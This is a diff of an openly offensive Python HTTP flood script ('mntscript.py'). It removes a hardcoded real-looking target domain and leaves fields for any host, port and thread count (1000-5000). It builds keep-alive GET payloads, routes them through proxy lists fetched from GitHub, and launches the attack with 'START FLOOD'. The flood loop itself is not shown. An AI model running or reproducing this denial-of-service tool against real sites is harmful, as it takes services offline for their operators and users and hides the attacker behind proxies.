@@ -10,7 +10,6 @@ from ssl import create_default_context
 from colored import fg, bg, attr
 
 razdel = "_________________________________________________\n"
-cmd1 = "stop"
 
 def __Flood__():
     while 1:
@@ -38,7 +37,6 @@ def Start():
 
 if __name__ == '__main__':
     # USERAGENTS
-    #
     # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/100useragentslist.py : 100 useragents(python list)
     # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/2kuseragents.txt : 2k useragents(non python list)
     # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/5kuseragents.txt : 5k useragents(non python list)
@@ -47,27 +45,25 @@ if __name__ == '__main__':
     # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/50kuseragents.txt : 50k useragents(non python list)
 
     # SETTINGS
-    HOST = "ventox.lol"
-    PORT = 443
-    KEEPALIVE = 300
-    SECONDS = -1
-    THREADS = 5000 # SET THREADS FOR RANGE 3000-5000
+    HOST = "" # please, enter url without http:// and https://
+    PORT =  # 80 for http site, 443 for https site
+    KEEPALIVE = 300 # connection alive
+    SECONDS = -1 # thats a visual param
+    THREADS =  # enter threads for range 1000-5000
     PAYLOAD = f'GET / HTTP/1.1\r\nHost: {HOST}\r\nKeep-Alive: {KEEPALIVE}\r\nConnection: keep-alive\r\n\r\n'.encode() # HEADERS
     PROXIES = urlopen('https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/bestprox.txt').read().decode().splitlines() # PROXIES  
-    conc = THREADS / 1000
+    conc = THREADS / 1000 # thats a visual param
     
     # PROXIES
-    # 
     # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/allprox.txt : 6.8k proxies
     # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/prox.txt : 364 proxies
     # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/bestprox.txt : 444 proxies
-    #
     
-    print(f"{fg(99)}███╗░░░███╗███╗░░██╗████████╗\n████╗░████║████╗░██║╚══██╔══╝\n██╔████╔██║██╔██╗██║░░░██║░░░\n██║╚██╔╝██║██║╚████║░░░██║░░░\n██║░╚═╝░██║██║░╚███║░░░██║░░░\n╚═╝░░░░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░\n{attr(0)}")
+    print(f"{fg(99)}███╗░░░███╗███╗░░██╗████████╗\n████╗░████║████╗░██║╚══██╔══╝\n██╔████╔██║██╔██╗██║░░░██║░░░\n██║╚██╔╝██║██║╚████║░░░██║░░░\n██║░╚═╝░██║██║░╚███║░░░██║░░░\n╚═╝░░░░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░\n{attr(0)}") # logo
     print(f"{fg(54)}" + razdel + f"{attr(0)}")
     print(f"{fg(93)}root@mntscript > {attr(0)}", f"{fg(93)}[mntscript.py] prepared{attr(0)}", conc, f"{fg(93)}concurrents{attr(0)} (",THREADS,f"threads) {fg(93)}to host{attr(0)}", HOST, f"{fg(93)}with port{attr(0)}", PORT, f"{fg(93)}for{attr(0)}", SECONDS, f"{fg(93)}seconds{attr(0)}")
     print(f"{fg(93)}root@mntscript > {attr(0)}", f"{fg(93)}[mntscript.py] script by $t1cky.dev{attr(0)}")
     test = input(f"{fg(93)}root@mntscript >  {attr(0)}" + f"{fg(93)}[mntscript.py] *PRESS ANY KEY TO START SCRIPT* {attr(0)}")
     print(f"{fg(93)}root@mntscript > {attr(0)}", f"{fg(93)}[mntscript.py] sended{attr(0)}", conc, f"{fg(93)}concurrents to host{attr(0)}", HOST, f"{fg(93)}with port{attr(0)}", PORT, f"{fg(93)}for{attr(0)}", SECONDS, f"{fg(93)}seconds{attr(0)}")
+    
     Start() # START FLOOD
-   
